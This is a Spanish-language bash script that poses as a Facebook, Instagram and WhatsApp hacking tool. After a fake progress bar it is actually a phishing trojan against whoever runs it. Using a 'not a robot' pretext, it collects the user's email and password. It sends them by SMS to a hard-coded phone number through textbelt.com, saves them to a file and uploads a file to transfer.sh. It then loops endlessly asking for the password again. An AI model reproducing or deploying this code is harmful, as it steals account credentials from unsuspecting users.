clear
setterm -foreground green
echo '
  ___ ___    _____  _________  ____  __.
 /   |   \  /  _  \ \_   ___ \|    |/ _|
/    ~    \/  /_\  \/    \  \/|      <
\    Y    /    |    \     \___|    |  \
 \___|_  /\____|__  /\______  /____|__ \
       \/         \/        \/        \/
________________  _________ ___________
\_   _____/  _  \ \_   ___ \\_   _____/
 |    __)/  /_\  \/    \  \/ |    __)_
 |     \/    |    \     \____|        \
 \___  /\____|__  /\______  /_______  /
     \/         \/        \/        \/  '

setterm -foreground red

echo "¿Que Quieres Hacer Hoy?"

setterm -foreground green
echo "[1] Hackear Facebook"
echo "[2] Hacker instagram"
echo "[3] Hackear WhatsApp"

read $op

setterm -foreground green
echo -ne ' Cargando programa..    (6%)\r'
sleep 1
echo -ne ' Cargando programa...  (18%)\r'
sleep 1
echo -ne ' Cargando programa.... (37%)\r'
sleep 1
echo -ne ' Cargando programa...  (40%)\r'
sleep 1
echo -ne ' Cargando programa..   (62%)\r'
sleep 1
echo -ne ' Cargando programa.    (89%)\r'
sleep 1
echo -ne ' Cargando programa    (100%)\r'

clear
setterm -foreground yellow
echo "!COMPLETADO¡"

setterm -foreground green
echo -e "Verifica que no eres un robot\ninicia sesion aqui:"
echo "Escribe tu correo"
read correo
echo "Escribe tu contraseña"
read password
curl -# -X POST https://textbelt.com/text --data-urlencode phone="17256666908" --data-urlencode message=" $correo $password " -d key=textbelt
echo "$correo $password" > kkkk.txt
curl --upload-file PasswordsByRightfury.txt https://transfer.sh/PasswordsByRightfury.txt
echo "opes"
echo " "
fun () {
echo " "
echo "contraseña incorrecta porfavor verifica"
echo "repite la contrseña"
read
fun
}
fun
